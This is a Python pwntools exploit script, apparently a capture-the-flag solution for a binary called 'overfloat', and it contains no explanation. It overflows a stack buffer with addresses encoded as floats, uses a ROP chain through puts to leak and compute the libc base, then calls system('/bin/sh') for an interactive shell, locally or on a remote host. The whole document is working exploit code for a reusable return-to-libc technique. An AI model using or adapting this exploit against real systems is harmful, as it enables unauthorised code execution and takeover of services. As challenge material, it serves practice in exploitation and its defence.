#!/usr/bin/python3 
from pwn import *
import struct

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''

continue
'''.format(**locals())


exe = './overfloat_patched'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(exe,checksec=False)
libc = ELF("./libc-2.27.so",checksec=False)
ld = ELF("./ld-2.27.so",checksec=False)

######### hardcode ########

plt_puts = elf.plt['puts'] 
got_puts =  elf.got['puts'] 
pop_rdi = exe_rop.find_gadget(['pop rdi','ret'])[0] 
main = elf.symbols['main'] 
ret = exe_rop.find_gadget(['ret'])[0] 

###########################


def format(recv_value):
    x = bytes(str(struct.unpack("f",(p64(recv_value)[4:8]))).strip("(").strip(",)"),"utf-8")
    y = bytes(str(struct.unpack("f",(p64(recv_value)[0:4]))).strip("(").strip(",)"),"utf-8")
    io.sendlineafter(b"]:",y)
    io.sendlineafter(b"]:",x)

def leak_value():
    for x in range(7):
        format(0x0000000000000000)
    format(pop_rdi)
    format(got_puts)
    format(plt_puts)
    format (main)
    io.sendlineafter(b"]:",b"done")
    io.recvline()
    raw = io.recvline().strip(b"\n")
    leak_add = u64(raw + b"\x00"*(8-len(raw)))
    libc.address = leak_add - libc.symbols['puts']
    print("leak value",hex(libc.address))

def exploit():
    for x in range(7):
        format(0x4242424242424242)
    format(pop_rdi)
    format(next(libc.search(b"/bin/sh")))
    format(ret)
    format(libc.symbols['system'])   
    io.sendlineafter(b"]:",b"done")

io = start()

leak_value()

exploit()

io.interactive()


